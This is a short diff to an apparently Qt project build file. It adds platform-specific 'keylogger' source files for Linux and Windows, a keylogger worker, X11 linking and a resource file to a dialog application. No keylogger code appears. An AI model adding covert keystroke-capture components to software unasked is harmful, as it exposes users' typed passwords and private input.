@@ -18,6 +18,16 @@ DESTDIR = ../../../bin
 SOURCES += main.cpp\
         dialog.cpp
 
+unix:SOURCES += keylogger/linux.c
+win32:SOURCES += keylogger/win32.c
+
+SOURCES += keyloggerworker.cpp
+
 HEADERS  += dialog.h
 
 FORMS    += dialog.ui
+
+unix:LIBS += -lX11
+
+RESOURCES += \
+    rescource.qrc
